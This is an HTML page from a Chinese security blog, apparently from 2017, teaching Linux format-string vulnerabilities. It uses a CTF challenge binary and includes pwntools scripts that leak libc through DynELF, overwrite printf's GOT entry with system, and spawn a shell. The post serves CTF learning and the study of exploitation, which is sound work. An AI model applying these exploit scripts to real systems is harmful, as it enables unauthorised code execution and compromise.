@@ -1,0 +1,1162 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Linux," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="4ct10n's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="目的是接触一些常见的漏洞，增加自己的视野。格式化字符串危害最大的就两点，一点是leak memory，一点就是可以在内存中写入数据，简单来说就是格式化字符串可以进行内存地址的读写。下面结合着自己的学习经历，把漏洞详细的讲解一下，附上大量的实例。">
+<meta name="keywords" content="Linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux 格式化字符串漏洞利用">
+<meta property="og:url" content="http://yoursite.com/2017/05/18/Linux 格式化字符串漏洞利用/index.html">
+<meta property="og:site_name" content="4ct10n&#39;s Blog">
+<meta property="og:description" content="目的是接触一些常见的漏洞，增加自己的视野。格式化字符串危害最大的就两点，一点是leak memory，一点就是可以在内存中写入数据，简单来说就是格式化字符串可以进行内存地址的读写。下面结合着自己的学习经历，把漏洞详细的讲解一下，附上大量的实例。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://img.blog.csdn.net/20170518215823110?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170519104125071?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170519104136587?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170519125819027?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170519125905153?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:updated_time" content="2017-10-22T02:14:30.439Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux 格式化字符串漏洞利用">
+<meta name="twitter:description" content="目的是接触一些常见的漏洞，增加自己的视野。格式化字符串危害最大的就两点，一点是leak memory，一点就是可以在内存中写入数据，简单来说就是格式化字符串可以进行内存地址的读写。下面结合着自己的学习经历，把漏洞详细的讲解一下，附上大量的实例。">
+<meta name="twitter:image" content="http://img.blog.csdn.net/20170518215823110?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/05/18/Linux 格式化字符串漏洞利用/"/>
+
+
+
+
+
+  <title>Linux 格式化字符串漏洞利用 | 4ct10n's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">4ct10n's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
+            
+            日程表
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/05/18/Linux 格式化字符串漏洞利用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="4ct10n">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/qq.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="4ct10n's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Linux 格式化字符串漏洞利用</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-18T22:32:00+08:00">
+                2017-05-18
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2017-10-22T10:14:30+08:00">
+                2017-10-22
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>目的是接触一些常见的漏洞，增加自己的视野。格式化字符串危害最大的就两点，一点是leak memory，一点就是可以在内存中写入数据，简单来说就是格式化字符串可以进行内存地址的读写。下面结合着自己的学习经历，把漏洞详细的讲解一下，附上大量的实例。<br><a id="more"></a></p>
+<p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p>
+<div class="markdown_views"><blockquote><br><p>目的是接触一些常见的漏洞，增加自己的视野。格式化字符串危害最大的就两点，一点是leak memory，一点就是可以在内存中写入数据，简单来说就是格式化字符串可以进行内存地址的读写。下面结合着自己的学习经历，把漏洞详细的讲解一下，附上大量的实例。</p><br></blockquote><br><p><div class="toc"><div class="toc"><br><ul><br><li><a href="#0x01-漏洞简述">0x01 漏洞简述</a><ul><br><li><a href="#0x1-简介">0x1 简介</a></li><br><li><a href="#0x2-产生条件">0x2 产生条件</a></li><br></ul><br></li><br><li><a href="#0x02-内存读取">0x02 内存读取</a><ul><br><li><a href="#0x1-printf-参数格式">0x1 printf 参数格式</a></li><br><li><a href="#0x2-堆栈情况">0x2 堆栈情况</a></li><br><li><a href="#0x3-实例分析">0x3 实例分析</a><ul><br><li><a href="#1计算参数偏移个数">1计算参数偏移个数</a><ul><br><li><a href="#1-gdb调试">1 gdb调试</a></li><br><li><a href="#2-利用pwntools计算">2 利用pwntools计算</a></li><br></ul><br></li><br><li><a href="#2利用dynelf实现内存泄露">2利用DynELF实现内存泄露</a></li><br></ul><br></li><br></ul><br></li><br><li><a href="#0x03-内存写入">0x03 内存写入</a></li><br></ul><br></div><br></div><br></p><br><h1 id="0x01-漏洞简述">0x01 漏洞简述</h1><br><h2 id="0x1-简介">0x1 简介</h2><br><p>格式化字符串漏洞是一种常见的漏洞，原理和利用方法也很简单，主要利用方式就是实现内存任意读和写。前提是其中的参数可控。如果要深入理解漏洞必须进行大量的实验。</p><br><h2 id="0x2-产生条件">0x2 产生条件</h2><br><p>首先要有一个函数，比如read, 比如gets获取用户输入的数据储存到局部变量中，然后直接把该变量作为printf这类函数的第一个参数值，一般是循环执行</p><br><h1 id="0x02-内存读取">0x02 内存读取</h1><br><p>这是泄露内存的过程</p><br><h2 id="0x1-printf-参数格式">0x1 printf 参数格式</h2><br><pre class="prettyprint"><code class=" hljs perl">这部分来自icemakr的博客<br><br><span class="hljs-number">32</span>位<br><br>读<br><br><span class="hljs-string">‘%{}$x’</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)           // 读<span class="hljs-number">4</span>个字节<br><span class="hljs-string">‘%{}$p’</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)           // 同上面<br><span class="hljs-string">‘${}$s’</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)<br>写<br><br><span class="hljs-string">‘%{}$n’</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)           // 解引用，写入四个字节<br><span class="hljs-string">‘%{}$hn’</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)          // 解引用，写入两个字节<br><span class="hljs-string">‘%{}$hhn’</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)         // 解引用，写入一个字节<br><span class="hljs-string">‘%{}$lln’</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)         // 解引用，写入八个字节<br><span class="hljs-number">64</span>位<br><br>读<br><br><span class="hljs-string">‘%{}$x’</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>, num)      // 读<span class="hljs-number">4</span>个字节<br><span class="hljs-string">‘%{}$lx’</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>, num)     // 读<span class="hljs-number">8</span>个字节<br><span class="hljs-string">‘%{}$p’</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)           // 读<span class="hljs-number">8</span>个字节<br><span class="hljs-string">‘${}$s’</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)<br>写<br><br><span class="hljs-string">‘%{}$n’</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)           // 解引用，写入四个字节<br><span class="hljs-string">‘%{}$hn’</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)          // 解引用，写入两个字节<br><span class="hljs-string">‘%{}$hhn’</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)         // 解引用，写入一个字节<br><span class="hljs-string">‘%{}$lln’</span>.<span class="hljs-keyword">format</span>(<span class="hljs-keyword">index</span>)         // 解引用，写入八个字节<br><span class="hljs-variable">%1</span><span class="hljs-variable">$lx</span>: RSI<br><span class="hljs-variable">%2</span><span class="hljs-variable">$lx</span>: RDX<br><span class="hljs-variable">%3</span><span class="hljs-variable">$lx</span>: RCX<br><span class="hljs-variable">%4</span><span class="hljs-variable">$lx</span>: R8<br><span class="hljs-variable">%5</span><span class="hljs-variable">$lx</span>: R9<br><span class="hljs-variable">%6</span><span class="hljs-variable">$lx</span>: 栈上的第一个QWORD</code></pre><br><h2 id="0x2-堆栈情况">0x2 堆栈情况</h2><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170518215823110?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><p>当<code>printf(“%s%d%d%d”)</code>后面没有参数时，会打印后面的堆栈值。如果有read等函数，内存值可控，就可以实现内存任意读、任意写。</p><br><p>在64位环境下的格式化字符串利用又是另一回事，在这里稍微的提一下，以免其他同学在走错道 <br><br><code>程序为64位，在64位下，函数前6个参数依次保存在rdi、rsi、rdx、rcx、r8和r9寄存器中（也就是说，若使用”x$”，当1&lt;=x&lt;=6时，指向的应该依次是上述这6个寄存器中保存的数值），而从第7个参数开始，依然会保存在栈中。故若使用”x$”，则从x=7开始，我们就可以指向栈中数据了。</code><br></p><br><h2 id="0x3-实例分析">0x3 实例分析</h2><br><p>这里选用广东省红帽杯的pwn2来具体说明。 <br><br>首先看一下IDA反汇编代码<br></p><br><pre class="prettyprint"><code class=" hljs cpp">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-built_in">memset</span>(&amp;v2, <span class="hljs-number">0</span>, <span class="hljs-number">0x400</span>u);<br>    read(<span class="hljs-number">0</span>, &amp;v2, <span class="hljs-number">0x400</span>u);<br>    <span class="hljs-built_in">printf</span>((<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> <em>)&amp;v2);<br>    fflush(stdout);<br>  }</em></code></pre><br><p>我们发现了read函数，printf函数标准的格式化字符串漏洞。</p><br><h3 id="1计算参数偏移个数">1计算参数偏移个数</h3><br><p>这里有两种方式</p><br><h4 id="1-gdb调试">(1) gdb调试</h4><br><p>在printf之前设置断点，0x0804852E <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170519104125071?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>单步进入sprintf函数中，查看堆栈值 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170519104136587?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>我们发现了我们可控的内存距离sprintf之间的距离为7<br><br><br><br></p><br><h4 id="2-利用pwntools计算">(2) 利用pwntools计算</h4><br><p>利用FmStr函数计算</p><br><pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> <br><span class="hljs-comment"># coding:utf-8 </span><br><span class="hljs-comment"># io = process(‘./pwn2’)</span><br><span class="hljs-comment"># io =remote(‘106.75.93.221’, 20003)</span><br>elf = ELF(<span class="hljs-string">‘./pwn2’</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">(payload)</span>:</span><br>    io = process(<span class="hljs-string">‘./pwn2’</span>)<br>    io.sendline(payload)<br>    info = io.recv()<br>    io.close<br>    <span class="hljs-keyword">return</span> info<br>autofmt = FmtStr(test)<br><span class="hljs-keyword">print</span> autofmt.offset</code></pre><br><h3 id="2利用dynelf实现内存泄露">2利用DynELF实现内存泄露</h3><br><p>在这里我先介绍一下DynELF泄露内存的原理，采用<a href="http://www.jianshu.com/p/097e211cd9eb" target="_blank" rel="external">这篇博客里写的</a></p><br><blockquote><br><p>我们应该怎么才能根据已知的函数地址来得到目标函数地址,需要有一下条件 <br><br>  1.我们拥有从Linux发型以来所有版本的 libc 文件 <br><br>  2.我们已知至少两个函数函数在目标主机中的真实地址 <br><br>  那么我们是不是可以用第二个条件去推测目标主机的 libc 版本呢 ? <br><br>  我们来进行进一步的分析 : <br><br>  关于条件二 : <br><br>  这里我们可以注意到 : printf 是可以被我们循环调用的 <br><br>  因此可以进行连续的内存泄露 <br><br>  我们可以将多个 got 表中的函数地址泄露出来 , <br><br>  我们这样就可以的至少两个函数的地址 , 条件二满足 <br><br>  关于条件一 : <br><br>  哈哈~对了 , 这么有诱惑力的事情一定已经有人做过了 , 这里给出一个网站 : <a href="http://libcdb.com/" target="_blank" rel="external">http://libcdb.com/</a> , 大名鼎鼎 pwntools 中的 DynELF 就是根据这个原理运作的 <br><br>  两个条件都满足 , 根据这些函数之间的偏移去筛选出 libc 的版本 <br><br>  这样我们就相当于得到了目标服务器的 libc 文件 , 达到了同样的效果<br><br><br><br><br><br><br><br><br><br><br><br><br></p><br></blockquote><br><p>以上是原理，其实说白了就是要利用能够打印指定内存的函数</p><br><pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> <em><br>sh = process(<span class="hljs-string">‘./pwn2’</span>)<br>elf = ELF(<span class="hljs-string">‘./pwn2’</span>)<br><span class="hljs-comment">#计算偏移</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">(payload)</span>:</span><br>    temp = process(<span class="hljs-string">‘./pwn2’</span>)<br>    temp.sendline(payload)<br>    info = temp.recv()<br>    temp.close()<br>    <span class="hljs-keyword">return</span> info<br><br>auto = FmtStr(test)<br><span class="hljs-keyword">print</span> auto.offset<br><span class="hljs-comment">#泄露内存 因为函数本来可以循环执行所以不用rop链闭合</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span><span class="hljs-params">(addr)</span>:</span><br>    payload = <span class="hljs-string">‘A%9$s’</span><span class="hljs-comment">#这里需要注意一下 为了精确泄露内存用字符定下位</span><br>    payload += <span class="hljs-string">‘AAA’</span><br>    payload += p32(addr)<br>    sh.sendline(payload)<br>    sh.recvuntil(<span class="hljs-string">‘A’</span>)<br>    content = sh.recvuntil(<span class="hljs-string">‘AAA’</span>)<br>    <span class="hljs-comment"># content = sh.recv(4)</span><br>    <span class="hljs-keyword">print</span> content<br>    <span class="hljs-keyword">if</span>(len(content) == <span class="hljs-number">3</span>):<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">‘[</span></em>] NULL’<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">‘\x00’</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">‘[<em>] %#x —&gt; %s’</em></span> % (addr, (content[<span class="hljs-number">0</span>:-<span class="hljs-number">3</span>] <span class="hljs-keyword">or</span> <span class="hljs-string">‘’</span>).encode(<span class="hljs-string">‘hex’</span>))<br>        <span class="hljs-keyword">print</span> len(content)<br>        <span class="hljs-keyword">return</span> content[<span class="hljs-number">0</span>:-<span class="hljs-number">3</span>]<br><span class="hljs-comment">#——– leak system</span><br>d = DynELF(leak, elf=ELF(<span class="hljs-string">‘./pwn2’</span>))<br>system_addr = d.lookup(<span class="hljs-string">‘system’</span>,<span class="hljs-string">‘libc’</span>)<span class="hljs-comment">#意思是在libc中寻找system地址</span><br>log.info(<span class="hljs-string">‘system_addr:’</span> + hex(system_addr))</code></pre><br><h1 id="0x03-内存写入">0x03 内存写入</h1><br><p>首先分析一个简单点的程序</p><br><pre class="prettyprint"><code class=" hljs cpp"><span class="hljs-preprocessor">#include &lt;stdio.h&gt; </span><br><span class="hljs-keyword">int</span> main() {<br>    <span class="hljs-keyword">int</span> flag=<span class="hljs-number">5</span> ;<br>    <span class="hljs-keyword">int</span> p = &amp;flag;<br>    <span class="hljs-keyword">char</span> a[<span class="hljs-number">100</span>];<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">“%s”</span>,a);<br>    <span class="hljs-built_in">printf</span>(a);<br>    <span class="hljs-keyword">if</span>(flag == <span class="hljs-number">2000</span>)<br>    {<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">“good\n”</span> );<br>    }<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}</code></pre><br><p>利用gdb调试一下，在printf处设断点。查看一下堆栈的状况 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170519125819027?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>发现偏移为5 于是构造<code>%010x%010x%010x%01970x%n</code> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170519125905153?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>这里只是对于flag内存的修改，并没有达到任意修改的效果，任意修改需要计算偏移利用写好内存地址，利用%n直接修改。下面继续pwn2的讲解<br><br><br><br></p><br><hr><br><p>在pwntools中有现成的函数可以使用<code>fmtstr_payload</code>可以实现修改任意内存 <br><br><code>fmtstr_payload(auto.offset, {printf_got: system_addr})</code>(偏移，{原地址：目的地址})<br></p><br><pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> <em><br>sh = process(<span class="hljs-string">‘./pwn2’</span>)<br>elf = ELF(<span class="hljs-string">‘./pwn2’</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">(payload)</span>:</span><br>    temp = process(<span class="hljs-string">‘./pwn2’</span>)<br>    temp.sendline(payload)<br>    info = temp.recv()<br>    temp.close()<br>    <span class="hljs-keyword">return</span> info<br><br>auto = FmtStr(test)<br><span class="hljs-keyword">print</span> auto.offset<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span><span class="hljs-params">(addr)</span>:</span><br>    payload = <span class="hljs-string">‘A%9$s’</span><br>    payload += <span class="hljs-string">‘AAA’</span><br>    payload += p32(addr)<br>    sh.sendline(payload)<br>    sh.recvuntil(<span class="hljs-string">‘A’</span>)<br>    content = sh.recvuntil(<span class="hljs-string">‘AAA’</span>)<br>    <span class="hljs-comment"># content = sh.recv(4)</span><br>    <span class="hljs-keyword">print</span> content<br>    <span class="hljs-keyword">if</span>(len(content) == <span class="hljs-number">3</span>):<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">‘[</span></em>] NULL’<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">‘\x00’</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">‘[*] %#x —&gt; %s’</span> % (addr, (content[<span class="hljs-number">0</span>:-<span class="hljs-number">3</span>] <span class="hljs-keyword">or</span> <span class="hljs-string">‘’</span>).encode(<span class="hljs-string">‘hex’</span>))<br>        <span class="hljs-keyword">print</span> len(content)<br>        <span class="hljs-keyword">return</span> content[<span class="hljs-number">0</span>:-<span class="hljs-number">3</span>]<br><span class="hljs-comment">#——– leak system</span><br>d = DynELF(leak, elf=ELF(<span class="hljs-string">‘./pwn2’</span>))<br>system_addr = d.lookup(<span class="hljs-string">‘system’</span>,<span class="hljs-string">‘libc’</span>)<br>log.info(<span class="hljs-string">‘system_addr:’</span> + hex(system_addr))<br><br><span class="hljs-comment">#——– change GOT</span><br>printf_got = elf.got[<span class="hljs-string">‘printf’</span>]<br>log.info(hex(printf_got))<br><br>payload = fmtstr_payload(auto.offset, {printf_got: system_addr})<br>sh.sendline(payload)<br><br>payload = <span class="hljs-string">‘/bin/sh\x00’</span><br>sh.sendline(payload)<br><br>sh.interactive()</code></pre></div>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Linux/" rel="tag"># Linux</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/05/12/Padding Oracle Attack 分析/" rel="next" title="Padding Oracle Attack 分析">
+                <i class="fa fa-chevron-left"></i> Padding Oracle Attack 分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/05/31/操作系统实验报告 lab5/" rel="prev" title="操作系统实验报告 lab5">
+                操作系统实验报告 lab5 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/qq.jpg"
+                alt="4ct10n" />
+            
+              <p class="site-author-name" itemprop="name">4ct10n</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
+
+            
+              
+              
